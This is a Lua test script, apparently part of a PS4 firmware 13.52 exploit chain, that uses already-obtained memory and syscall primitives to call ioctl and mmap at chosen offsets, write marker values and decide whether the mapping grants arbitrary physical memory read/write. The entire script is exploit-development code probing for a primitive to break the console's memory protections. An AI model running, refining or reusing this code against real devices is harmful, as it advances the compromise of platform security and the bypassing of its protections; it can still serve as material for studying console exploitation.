-- PS4 FW 13.52 - DECISIVE MARKER TEST (r9z) — case (a) fixed window vs case (b) arbitrary phys
-- If marker written at m1+0x1000 (VA 0x2ec49000) REAPPEARS at m2+0x1000 (VA 0x40001000)
--   after mapping at a different base → both VAs alias phys 0x2ec49000 → window FIXED (a).
-- If marker is ABSENT at m2+0x1000 and self-pointer at m2+0x18 = 0xffffffff40000000
--   → each mmap(off=X) maps DISTINCT phys=X → ARBITRARY PHYS R/W (b)!
-- Mirrors r9v's known-safe pattern: ioctl{base,0x100000} then mmap(off=base).

local mem = rawget(_G, "memory")
local S = rawget(_G, "syscall")

pcall(S.resolve, { ioctl = 54, mmap = 477 })

local function t(v)
  if v == nil then return -1 end
  if type(v) == "number" then return v end
  if type(v) == "table" and v.h ~= nil then return v.h * 4294967296 + v.l end
  return tonumber(tostring(v)) or -1
end
local function rq(a) return t(mem.read_qword(a)) end

print("=== R9Z START ===")
pcall(function()
  local buf = mem.alloc(0x200)
  local function rearm(base)
    mem.write_buffer(buf, string.rep(string.char(0x00), 0x200), 0x200)
    mem.write_qword(buf, base)
    mem.write_qword(buf + 8, 0x100000)
    return t(S.ioctl(5, 0x80108002, buf))
  end
  local function map(base)
    local m = t(S.mmap(base, 0x100000, 3, 0x0001, 5, 0))
    print(string.format("  mmap(off=0x%x)=0x%x  +0x18=0x%016x", base, m, rq(m + 0x18)))
    return m
  end

  print("--- STEP 1: map at 0x2ec48000, write markers ---")
  rearm(0x2ec48000)
  local m1 = map(0x2ec48000)
  mem.write_qword(m1 + 0x1000, 0xAABBCCDD)
  mem.write_qword(m1 + 0x2000, 0x55667788)
  print(string.format("  wrote @+0x1000=0xAABBCCDD @+0x2000=0x55667788 -> readback %08x/%08x",
    rq(m1 + 0x1000), rq(m1 + 0x2000)))

  print("--- STEP 2: map at DIFFERENT base 0x40000000 ---")
  rearm(0x40000000)
  local m2 = map(0x40000000)
  print(string.format("  m2+0x1000=0x%016x m2+0x2000=0x%016x", rq(m2 + 0x1000), rq(m2 + 0x2000)))

  print("--- STEP 3: map back at 0x2ec48000 ---")
  rearm(0x2ec48000)
  local m3 = map(0x2ec48000)
  print(string.format("  m3+0x1000=0x%016x m3+0x2000=0x%016x", rq(m3 + 0x1000), rq(m3 + 0x2000)))

  local fixed = rq(m2 + 0x18) == 0xffffffff2ec48000 and rq(m2 + 0x1000) == 0xAABBCCDD
  print(string.format("=== VERDICT: %s ===", fixed and "WINDOW FIXED at phys 0x2ec48000 (case a)" or "MAPPING FOLLOWS OFFSET -> ARBITRARY PHYS (case b)!"))
end)
print("=== R9Z DONE ===")
